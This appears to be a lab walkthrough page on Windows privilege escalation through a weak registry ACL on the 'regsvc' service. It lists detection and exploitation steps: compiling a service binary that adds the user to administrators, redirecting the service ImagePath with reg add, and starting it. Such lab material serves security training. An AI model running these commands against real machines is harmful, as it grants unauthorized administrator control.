<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Overview (regsvc ACL)</title>
</head><body><span style="font-size: 15pt">Detection<br/>
<br/>
Windows VM<br/>
<br/>
1. Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl<br/>
2. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.<br/>
<br/>
Exploitation<br/>
<br/>
Windows VM<br/>
<br/>
1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.<br/>
<br/>
Kali VM<br/>
<br/>
1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add<br/>
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') <br/>
3. Copy the generated file x.exe, to the Windows VM.<br/>
<br/>
Windows VM<br/>
<br/>
1. Place x.exe in ‘C:\Temp’.<br/>
2. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f<br/>
3. In the command prompt type: sc start regsvc<br/>
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</span></body></html>